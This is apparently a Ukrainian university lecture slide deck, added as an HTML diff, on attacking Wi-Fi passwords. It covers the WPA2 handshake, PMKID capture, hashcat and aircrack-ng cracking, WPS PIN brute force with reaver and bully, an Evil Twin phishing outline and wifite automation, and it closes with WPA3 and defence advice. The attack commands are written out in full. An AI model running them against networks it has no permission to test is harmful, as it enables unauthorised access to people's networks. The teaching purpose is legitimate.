@@ -1,0 +1,202 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 6.6 — Атаки на Wi-Fi паролі</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="6">
+  <div class="slide-deck">
+
+    <!-- Slide 1: Title -->
+    <section class="slide active title-slide">
+      <h1>Атаки на Wi-Fi паролі</h1>
+      <div class="subtitle">Тема 6.6 — Брутфорс та атаки на паролі</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <!-- Slide 2: WPA/WPA2: 4-Way Handshake -->
+    <section class="slide">
+      <h2>WPA/WPA2: 4-Way Handshake</h2>
+      <div class="info-box">
+        WPA2 використовує 4-Way Handshake для встановлення ключа шифрування. Перехоплення handshake дозволяє офлайн-крекінг пароля.
+      </div>
+      <div class="flow-row">
+        <div class="flow-step">AP</div>
+        <div class="flow-arrow">→ ANonce →</div>
+        <div class="flow-step">Client</div>
+        <div class="flow-arrow">→ SNonce →</div>
+        <div class="flow-step">AP</div>
+        <div class="flow-arrow">→ GTK →</div>
+        <div class="flow-step">Client</div>
+        <div class="flow-arrow">→ ACK →</div>
+        <div class="flow-step">AP</div>
+      </div>
+      <div class="two-column">
+        <div class="column">
+          <div class="card-blue">
+            <h3>Як працює атака</h3>
+            <ol style="margin: 0; padding-left: 20px;">
+              <li>Перевести адаптер у Monitor Mode</li>
+              <li>Сканувати мережі (airodump-ng)</li>
+              <li>Перехопити handshake (чекати або deauth)</li>
+              <li>Крекінг офлайн (aircrack-ng / hashcat)</li>
+            </ol>
+          </div>
+        </div>
+        <div class="column">
+          <div class="code-block">
+            <span class="code-comment"># Monitor mode</span><br>
+            <code><span class="code-keyword">airmon-ng</span> start wlan0</code><br><br>
+            <span class="code-comment"># Сканування мереж</span><br>
+            <code><span class="code-keyword">airodump-ng</span> wlan0mon</code><br><br>
+            <span class="code-comment"># Захоплення handshake конкретної мережі</span><br>
+            <code><span class="code-keyword">airodump-ng</span> -c 6 --bssid AA:BB:CC:DD:EE:FF \<br>
+              &nbsp;&nbsp;-w capture wlan0mon</code><br><br>
+            <span class="code-comment"># Деаутентифікація клієнта (прискорення)</span><br>
+            <code><span class="code-keyword">aireplay-ng</span> -0 5 -a AA:BB:CC:DD:EE:FF wlan0mon</code>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 3: PMKID атака та крекінг -->
+    <section class="slide">
+      <h2>PMKID атака та крекінг</h2>
+      <div class="info-box">
+        <strong>PMKID атака (2018)</strong> — не потребує підключеного клієнта! Достатньо першого пакета від AP.
+      </div>
+      <div class="two-column">
+        <div class="column">
+          <div class="card-green">
+            <h3>PMKID (без клієнта!)</h3>
+            <ul style="margin: 10px 0; padding-left: 20px;">
+              <li>Виявлена hashcat-розробником Jens Steube (2018)</li>
+              <li>AP надсилає PMKID у першому повідомленні</li>
+              <li>PMKID = HMAC-SHA1-128(PMK, "PMK Name" | MAC_AP | MAC_STA)</li>
+              <li>Не потрібен повний handshake</li>
+            </ul>
+            <div class="code-block">
+              <span class="code-comment"># Захоплення PMKID</span><br>
+              <code><span class="code-keyword">hcxdumptool</span> -i wlan0mon \<br>
+                &nbsp;&nbsp;--enable_status=1 -o capture.pcapng</code><br><br>
+              <span class="code-comment"># Конвертація</span><br>
+              <code><span class="code-keyword">hcxpcapngtool</span> -o hash.22000 capture.pcapng</code>
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-purple">
+            <h3>Крекінг Wi-Fi паролів</h3>
+            <div class="code-block">
+              <span class="code-comment"># Aircrack-ng (CPU)</span><br>
+              <code><span class="code-keyword">aircrack-ng</span> -w rockyou.txt capture-01.cap</code><br><br>
+              <span class="code-comment"># Hashcat (GPU) — WPA-PBKDF2</span><br>
+              <code><span class="code-keyword">hashcat</span> -m 22000 hash.22000 rockyou.txt</code><br><br>
+              <span class="code-comment"># Hashcat з правилами</span><br>
+              <code><span class="code-keyword">hashcat</span> -m 22000 hash.22000 rockyou.txt \<br>
+                &nbsp;&nbsp;-r best64.rule</code>
+            </div>
+            <div class="warning-box" style="margin-top: 10px;">
+              <strong>Обмеження:</strong> WPA2 використовує PBKDF2 (4096 ітерацій) — RTX 4090: ~2.5 млн хешів/сек. 8-символьний пароль (a-z) ≈ 23 години.
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 4: WPS, Evil Twin та автоматизація -->
+    <section class="slide">
+      <h2>WPS, Evil Twin та автоматизація</h2>
+      <div class="three-col-grid">
+        <div class="card-red">
+          <h3>WPS PIN атака</h3>
+          <ul style="margin: 10px 0; padding-left: 20px;">
+            <li>WPS PIN — 8 цифр (реально 11,000 комбінацій)</li>
+            <li>Reaver: brute-force WPS PIN</li>
+          </ul>
+          <div class="code-block">
+            <span class="code-comment"># Пошук AP з WPS</span><br>
+            <code><span class="code-keyword">wash</span> -i wlan0mon</code><br><br>
+            <span class="code-comment"># Атака на WPS PIN</span><br>
+            <code><span class="code-keyword">reaver</span> -i wlan0mon \<br>
+              &nbsp;&nbsp;-b AA:BB:CC:DD:EE:FF -vv</code><br><br>
+            <span class="code-comment"># Bully (альтернатива)</span><br>
+            <code><span class="code-keyword">bully</span> wlan0mon -b BSSID -vv</code>
+          </div>
+          <p style="margin-top: 10px;"><strong>Час:</strong> 4-10 годин</p>
+        </div>
+        <div class="card-yellow">
+          <h3>Evil Twin (Fluxion)</h3>
+          <ul style="margin: 10px 0; padding-left: 20px;">
+            <li>Створити фейкову точку доступу</li>
+            <li>Деаутентифікувати жертву</li>
+            <li>Жертва підключається до фейкової AP</li>
+            <li>Captive portal збирає пароль</li>
+            <li style="margin-top: 10px;"><strong>Соціальна інженерія, не брутфорс</strong></li>
+          </ul>
+        </div>
+        <div class="card-green">
+          <h3>Wifite2 (автоматизація)</h3>
+          <ul style="margin: 10px 0; padding-left: 20px;">
+            <li>Автоматичне сканування</li>
+            <li>Автоматичний вибір атаки</li>
+          </ul>
+          <div class="code-block">
+            <span class="code-comment"># Автоматична атака</span><br>
+            <code><span class="code-keyword">wifite</span> --kill</code><br><br>
+            <span class="code-comment"># Тільки WPA</span><br>
+            <code><span class="code-keyword">wifite</span> --wpa</code><br><br>
+            <span class="code-comment"># З конкретним словником</span><br>
+            <code><span class="code-keyword">wifite</span> --dict rockyou.txt</code>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <!-- Slide 5: WPA3 та захист Wi-Fi -->
+    <section class="slide">
+      <h2>WPA3 та захист Wi-Fi</h2>
+      <div class="two-column">
+        <div class="column">
+          <div class="card-purple">
+            <h3>WPA3-SAE (Simultaneous Authentication of Equals)</h3>
+            <ul style="margin: 10px 0; padding-left: 20px;">
+              <li>Замість PSK — протокол Dragonfly</li>
+              <li>Захист від офлайн-атак на словник</li>
+              <li>Forward secrecy — компрометація пароля не розшифрує минулий трафік</li>
+              <li>Dragonblood (2019) — side-channel атаки на деякі реалізації (CVE-2019-9494)</li>
+              <li>Поки що обмежене поширення</li>
+            </ul>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-green">
+            <h3>Рекомендації захисту Wi-Fi</h3>
+            <div class="checklist">
+              <div>✓ Використовувати WPA3 або WPA2 з довгим паролем (12+ символів)</div>
+              <div>✓ Вимкнути WPS</div>
+              <div>✓ Змінити SSID за замовчуванням</div>
+              <div>✓ Фільтрація MAC (слабкий, але додатковий)</div>
+              <div>✓ RADIUS автентифікація (WPA2-Enterprise)</div>
+              <div>✓ Моніторинг rogue AP</div>
+              <div>✓ Регулярне оновлення firmware</div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls">
+    <button id="btn-prev" onclick="prev()">&#8592;</button>
+    <button id="btn-next" onclick="next()">&#8594;</button>
+  </div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
